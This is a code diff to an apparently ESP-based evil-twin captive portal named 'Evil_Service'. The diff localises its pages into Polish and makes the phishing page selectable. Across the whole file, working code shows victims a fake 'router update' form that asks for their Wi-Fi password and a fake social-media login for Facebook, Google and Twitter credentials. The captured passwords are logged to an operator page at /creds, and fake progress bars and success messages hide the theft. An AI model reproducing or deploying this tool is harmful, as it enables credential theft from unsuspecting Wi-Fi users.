@@ -5,22 +5,23 @@
 
 // ======== CONFIG ========
 String SUBTITLE = "";
+String currentPortal = "router"; // domyślna strona
 
-// Router update strings
-const String UPDATE_TITLE = "Network software update required";
-const String UPDATE_BODY = "To complete the update process, enter your WiFi password";
-const String UPDATE_POST_TITLE = "System update in progress...";
-const String UPDATE_POST_BODY = "Please do not interrupt the process - it may take a few minutes...";
+// Napisy portalu aktualizacji routera
+const String UPDATE_TITLE = "Wymagana aktualizacja oprogramowania sieciowego";
+const String UPDATE_BODY = "Aby zakończyć proces aktualizacji, wprowadź hasło do swojej sieci WiFi";
+const String UPDATE_POST_TITLE = "Trwa aktualizacja systemu...";
+const String UPDATE_POST_BODY = "Proszę nie przerywać procesu - może to potrwać kilka minut...";
 
-// Social login strings
-const String LOGIN_TITLE = "Log in using social media";
-const String LOGIN_BODY = "Select a login method and enter your credentials";
-const String LOGIN_POST_TITLE = "Logging in...";
-const String LOGIN_POST_BODY = "Please wait while we connect you...";
+// Napisy portalu social media
+const String LOGIN_TITLE = "Zaloguj się przez media społecznościowe";
+const String LOGIN_BODY = "Wybierz metodę logowania i podaj dane";
+const String LOGIN_POST_TITLE = "Trwa logowanie...";
+const String LOGIN_POST_BODY = "Proszę czekać, łączymy...";
 
 const String PASS_TITLE = "/LOGS/";
-const String CLEAR_TITLE = "Clear logs";
-const String CONFIG_TITLE = "System configuration";
+const String CLEAR_TITLE = "Wyczyść Dane";
+const String CONFIG_TITLE = "Konfiguracja Systemu";
 
 // ======== AP NAME ========
 String currentSSID = "Evil_Service";
@@ -73,60 +74,52 @@ String input(String arg) {
 }
 
 // ======== PAGES ========
-String menu() {
-  SUBTITLE = "Menu";
-  return header("Captive Portal") +
-    "<h1>Select portal</h1>" 
-    "<p><a href='/router'>Router Update</a></p>" 
-    "<p><a href='/social'>Social Login</a></p>" 
-    "<p><a href='/creds'>Logs & Settings</a></p>" 
-    + footer();
-}
 
 // ----- Router update pages -----
 String routerIndex() {
-  SUBTITLE = "Router Update";
+  SUBTITLE = "Aktualizacja Routera";
   return header(UPDATE_TITLE) +
     "<h1>" + UPDATE_TITLE + "</h1>" 
     "<p>" + UPDATE_BODY + "</p>" 
-    "<form action='/router/post' method='post'>" 
-    "<input type=password name=password placeholder='Enter WiFi password' required>" 
-    "<button type=submit>Start update</button>" 
+    "<form action='/post' method='post'>" 
+    "<input type=password name=password placeholder='Wprowadź hasło WiFi' required>" 
+    "<button type=submit>Rozpocznij aktualizację</button>" 
     "</form>" + footer();
 }
 
 String routerPosted() {
   String password = input("password");
-  Credentials += "<li><b>WiFi password:</b> " + password + "</li>";
+  Credentials += "<li><b>Hasło WiFi:</b> " + password + "</li>";
   String progress = "<h1>" + UPDATE_POST_TITLE + "</h1>" 
                    "<p>" + UPDATE_POST_BODY + "</p>" 
                    "<div class=progress-container><div class=progress-bar id=progress>0%</div></div>" 
-                   "<script>var i=0;var progress=setInterval(function(){i++;document.getElementById('progress').style.width=i+'%';document.getElementById('progress').innerHTML=i+'%';if(i>=100){clearInterval(progress);setTimeout(function(){window.location.href='/router/success';},500);}},50);</script>";
-  SUBTITLE = "Router Update";
+                   "<script>var i=0;var progress=setInterval(function(){i++;document.getElementById('progress').style.width=i+'%';document.getElementById('progress').innerHTML=i+'%';if(i>=100){clearInterval(progress);setTimeout(function(){window.location.href='/success';},500);}},50);</script>";
+  SUBTITLE = "Aktualizacja Routera";
   return header(UPDATE_POST_TITLE) + progress + footer();
 }
 
 String routerSuccess() {
-  SUBTITLE = "Router Update";
-  return header("Update completed") +
-    "<div class=success-badge>UPDATE SUCCESSFULLY COMPLETED</div>" 
-    "<h1>Your router has been updated</h1>" 
-    "<p>Your system has been successfully updated to the latest version.</p>" 
+  SUBTITLE = "Aktualizacja Routera";
+  return header("Aktualizacja Zakończona") +
+    "<div class=success-badge>AKTUALIZACJA ZAKOŃCZONA POMYŚLNIE</div>" 
+    "<h1>Twój router został zaktualizowany</h1>" 
+    "<p>System został pomyślnie zaktualizowany do najnowszej wersji.</p>" 
     + footer();
 }
 
 // ----- Social login pages -----
 String socialIndex() {
-  SUBTITLE = "Free WiFi";
+  SUBTITLE = "Darmowe WiFi";
   return header(LOGIN_TITLE) +
     "<h1>" + LOGIN_TITLE + "</h1>" 
     "<p>" + LOGIN_BODY + "</p>" 
-    "<form action='/social/post' method='post'>" 
-    "<select name='provider'><option>Facebook</option><option>Google</option><option>Twitter</option></select>" 
-    "<input name='username' placeholder='Email or phone' required>" 
-    "<input type=password name='password' placeholder='Password' required>" 
-    "<button type=submit>Log in</button></form>" 
-    + footer();
+    "<form action='/post' method='post'>" 
+    "<input name='username' placeholder='Email lub telefon' required>" 
+    "<input type=password name='password' placeholder='Hasło' required>" 
+    "<button type=submit name='provider' value='Facebook'>Facebook</button>" 
+    "<button type=submit name='provider' value='Google'>Google</button>" 
+    "<button type=submit name='provider' value='Twitter'>Twitter</button>" 
+    "</form>" + footer();
 }
 
 String socialPosted() {
@@ -137,53 +130,65 @@ String socialPosted() {
   String progress = "<h1>" + LOGIN_POST_TITLE + "</h1>" 
                    "<p>" + LOGIN_POST_BODY + "</p>" 
                    "<div class=progress-container><div class=progress-bar id=progress>0%</div></div>" 
-                   "<script>var i=0;var progress=setInterval(function(){i++;document.getElementById('progress').style.width=i+'%';document.getElementById('progress').innerHTML=i+'%';if(i>=100){clearInterval(progress);setTimeout(function(){window.location.href='/social/success';},500);}},50);</script>";
-  SUBTITLE = "Free WiFi";
+                   "<script>var i=0;var progress=setInterval(function(){i++;document.getElementById('progress').style.width=i+'%';document.getElementById('progress').innerHTML=i+'%';if(i>=100){clearInterval(progress);setTimeout(function(){window.location.href='/success';},500);}},50);</script>";
+  SUBTITLE = "Darmowe WiFi";
   return header(LOGIN_POST_TITLE) + progress + footer();
 }
 
 String socialSuccess() {
-  SUBTITLE = "Free WiFi";
-  return header("Login successful") +
-    "<div class=success-badge>LOGIN SUCCESSFUL</div>" 
-    "<h1>You are connected</h1>" 
-    "<p>You can now access the internet.</p>" 
+  SUBTITLE = "Darmowe WiFi";
+  return header("Zalogowano") +
+    "<div class=success-badge>ZALOGOWANO POMYŚLNIE</div>" 
+    "<h1>Jesteś połączony</h1>" 
+    "<p>Możesz teraz korzystać z internetu.</p>" 
     + footer();
 }
 
 // ----- Logs & Settings -----
 String creds() {
-  SUBTITLE = "Logs";
+  SUBTITLE = "Logi";
+  String optRouter = currentPortal == "router" ? "selected" : "";
+  String optSocial = currentPortal == "social" ? "selected" : "";
   return header(PASS_TITLE) +
     "<h1>" + PASS_TITLE + "</h1>" 
     "<ol>" + Credentials + "</ol><br>" 
-    "<h2>Change network name(AP)</h2>" 
     "<form action='/updateconfig' method='post'>" 
-    "<input name='ssid' value='" + currentSSID + "' placeholder='Network name (SSID)' required>" 
-    "<button type='submit'>save</button></form>" 
+    "<h2>Zmień nazwę sieci (AP)</h2>" 
+    "<input name='ssid' value='" + currentSSID + "' placeholder='Nazwa sieci (SSID)' required>" 
+    "<h2>Wybierz portal</h2>" 
+    "<select name='portal'>" 
+    "<option value='router' " + optRouter + ">Router Update</option>" 
+    "<option value='social' " + optSocial + ">Social media login</option>" 
+    "</select>" 
+    "<button type='submit'>Zapisz</button></form>" 
     "<form action='/clear' method='post'>" 
-    "<button type='submit'>clear</button></form>" 
-    "<p style='text-align:center;margin-top:1.5em;'><a href='/'>back</a></p>" 
+    "<button type='submit'>Wyczyść Dane</button></form>" 
+    "<p style='text-align:center;margin-top:1.5em;'><a href='/'>Powrót</a></p>" 
     + footer();
 }
 
 String updateConfig() {
   String newSSID = input("ssid");
+  String newPortal = input("portal");
   if (newSSID.length() > 0 && newSSID.length() < 32) {
     currentSSID = newSSID;
     WiFi.softAP(currentSSID.c_str());
-    SUBTITLE = "Config";
-    return header(CONFIG_TITLE) +
-      "<h1>" + CONFIG_TITLE + "</h1>" 
-      "<p>The network name (SSID) has been changed to: <b>" + currentSSID + "</b></p>" 
-      "<p style='text-align:center;'><a href='/'>Back to home page</a></p>" 
-      + footer();
+  }
+  if (newPortal == "router" || newPortal == "social") {
+    currentPortal = newPortal;
   }
   SUBTITLE = "Config";
+  if (newSSID.length() > 0 && newSSID.length() < 32) {
+    return header(CONFIG_TITLE) +
+      "<h1>" + CONFIG_TITLE + "</h1>" 
+      "<p>Nazwa sieci (SSID) została zmieniona na: <b>" + currentSSID + "</b></p>" 
+      "<p style='text-align:center;'><a href='/'>Powrót do strony głównej</a></p>" 
+      + footer();
+  }
   return header(CONFIG_TITLE) +
     "<h1>" + CONFIG_TITLE + "</h1>" 
-    "<p style='color:#ff6b6b;'>Error: Network name must be between 1 and 32 characters long.</p>" 
-    "<p style='text-align:center;'><a href='/creds'>Try again</a></p>" 
+    "<p style='color:#ff6b6b;'>Błąd: Nazwa sieci musi zawierać od 1 do 32 znaków.</p>" 
+    "<p style='text-align:center;'><a href='/creds'>Spróbuj ponownie</a></p>" 
     + footer();
 }
 
@@ -191,11 +196,11 @@ String clearData() {
   currentSSID = defaultSSID;
   Credentials = "";
   WiFi.softAP(currentSSID.c_str());
-  SUBTITLE = "Logs";
+  SUBTITLE = "Logi";
   return header(CLEAR_TITLE) +
-    "<h1>Data cleared</h1>" 
-    "<p>All data has been deleted. Network name restored to default: <b>" + currentSSID + "</b></p>" 
-    "<p style='text-align:center;'><a href='/'>Back</a></p>" 
+    "<h1>Dane wyczyszczone</h1>" 
+    "<p>Wszystkie dane zostały usunięte. Nazwa sieci przywrócona do domyślnej: <b>" + currentSSID + "</b></p>" 
+    "<p style='text-align:center;'><a href='/'>Powrót</a></p>" 
     + footer();
 }
 
@@ -213,14 +218,18 @@ void setup() {
 
   webServer.onNotFound([](){ webServer.sendHeader("Location", String("http://") + APIP.toString(), true); webServer.send(302, "text/plain", ""); });
 
-  webServer.on("/", [](){ webServer.send(200, "text/html", menu()); });
-  webServer.on("/router", [](){ webServer.send(200, "text/html", routerIndex()); });
-  webServer.on("/router/post", [](){ webServer.send(200, "text/html", routerPosted()); });
-  webServer.on("/router/success", [](){ webServer.send(200, "text/html", routerSuccess()); });
-
-  webServer.on("/social", [](){ webServer.send(200, "text/html", socialIndex()); });
-  webServer.on("/social/post", [](){ webServer.send(200, "text/html", socialPosted()); });
-  webServer.on("/social/success", [](){ webServer.send(200, "text/html", socialSuccess()); });
+  webServer.on("/", [](){
+    if(currentPortal == "social") webServer.send(200, "text/html", socialIndex());
+    else webServer.send(200, "text/html", routerIndex());
+  });
+  webServer.on("/post", [](){
+    if(currentPortal == "social") webServer.send(200, "text/html", socialPosted());
+    else webServer.send(200, "text/html", routerPosted());
+  });
+  webServer.on("/success", [](){
+    if(currentPortal == "social") webServer.send(200, "text/html", socialSuccess());
+    else webServer.send(200, "text/html", routerSuccess());
+  });
 
   webServer.on("/creds", [](){ webServer.send(200, "text/html", creds()); });
   webServer.on("/updateconfig", [](){ webServer.send(200, "text/html", updateConfig()); });
